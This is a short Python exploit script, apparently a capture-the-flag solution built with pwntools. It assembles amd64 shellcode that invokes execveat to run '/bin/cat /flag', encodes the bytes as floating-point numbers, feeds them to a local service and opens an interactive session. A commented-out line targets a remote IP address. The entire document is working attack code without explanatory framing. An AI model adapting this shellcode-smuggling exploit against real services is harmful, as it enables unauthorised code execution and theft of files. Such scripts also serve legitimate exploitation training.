from pwn import *
#from ptrlib import *
from struct import unpack

#sock = remote("13.233.66.116", 9000)
sock = remote("127.0.0.1", 4001)
_ = raw_input()

shellcode = asm(
    """
    push 0x42
    pop rax
    inc ah
    cqo

    push rdx
    movabs rdi, 0x67616c662f
    push rdi
    push rsp
    pop r12

    push rdx
    movabs rdi, 0x7461632f6e69622f
    push rdi
    push rsp
    pop rsi

    push rdx
    push r12
    push rsi
    push rsp
    pop rdx

    xor rdi, rdi
    mov r10, rdi
    mov r8, rdi
    syscall
    """,
    endian='little',
    arch="amd64",
    bits=64
)
shellcode += "\x90" * (8 - (len(shellcode) % 8))

print(disasm(shellcode, arch="amd64"))

for i in range(0, len(shellcode), 8):
    data = shellcode[i:i + 8]
    double = unpack('<d', data)[0]
    sock.sendline(repr(double))

sock.sendline("a")
sock.interactive()
